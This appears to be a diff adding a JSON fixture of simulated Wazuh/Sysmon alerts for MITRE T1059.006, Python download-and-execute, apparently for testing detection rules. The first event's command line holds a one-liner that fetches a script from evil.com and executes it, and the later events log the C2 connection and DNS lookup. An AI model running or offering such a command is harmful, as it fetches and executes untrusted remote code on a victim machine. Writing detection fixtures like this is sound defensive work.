@@ -1,0 +1,215 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.006",
+    "variation": "002",
+    "name": "Python Download and Execute",
+    "description": "Adversary uses Python to download and execute malicious script from remote server",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Python downloading script via urllib",
+      "sequence": 1,
+      "timestamp": "2026-01-30T12:00:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Python Download and Execute",
+          "id": "100510",
+          "mitre": {
+            "id": [
+              "T1059.006",
+              "T1105"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "Python",
+              "Ingress Tool Transfer"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000510.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 12:00:00.000",
+              "processGuid": "{A1B2C3D4-1059-0006-0010-000000000002}",
+              "processId": "8100",
+              "image": "C:\\Python310\\python.exe",
+              "commandLine": "python.exe -c \"import urllib.request; exec(urllib.request.urlopen('http://evil.com/payload.py').read())\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{A1B2C3D4-1059-0006-0009-000000000002}",
+              "parentProcessId": "8000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Python connecting to C2",
+      "sequence": 2,
+      "timestamp": "2026-01-30T12:00:01.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 3: Python C2 Connection",
+          "id": "100511",
+          "mitre": {
+            "id": [
+              "T1059.006",
+              "T1071.001"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "Python",
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000510.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 12:00:01.000",
+              "processGuid": "{A1B2C3D4-1059-0006-0010-000000000002}",
+              "processId": "8100",
+              "image": "C:\\Python310\\python.exe",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "198.51.100.20",
+              "sourcePort": "49678",
+              "destinationIp": "185.234.219.47",
+              "destinationPort": "80",
+              "destinationHostname": "evil.com"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 22 - Python DNS lookup",
+      "sequence": 3,
+      "timestamp": "2026-01-30T12:00:00.500Z",
+      "log": {
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 22: Python DNS Query to Suspicious Domain",
+          "id": "100512",
+          "mitre": {
+            "id": [
+              "T1059.006"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Python"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000510.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 12:00:00.500",
+              "processGuid": "{A1B2C3D4-1059-0006-0010-000000000002}",
+              "processId": "8100",
+              "image": "C:\\Python310\\python.exe",
+              "queryName": "evil.com",
+              "queryStatus": "0",
+              "queryResults": "185.234.219.47"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
